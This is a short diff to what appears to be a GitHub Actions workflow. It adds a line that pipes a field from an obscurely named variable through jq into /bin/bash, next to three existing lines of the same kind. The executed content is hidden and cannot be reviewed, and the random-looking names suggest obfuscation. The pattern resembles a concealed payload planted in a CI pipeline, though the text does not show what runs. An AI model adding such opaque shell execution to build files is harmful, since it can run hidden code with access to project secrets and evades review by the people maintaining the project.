@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$k5541" | jq -r .rzgf945 | /bin/bash
           echo $z844 | jq -r .xafmf2 | /bin/bash
           printf '%s' "$y423" | jq -r .xhk3 | /bin/bash
+          printf '%s' "$y3" | jq -r .pfj7 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
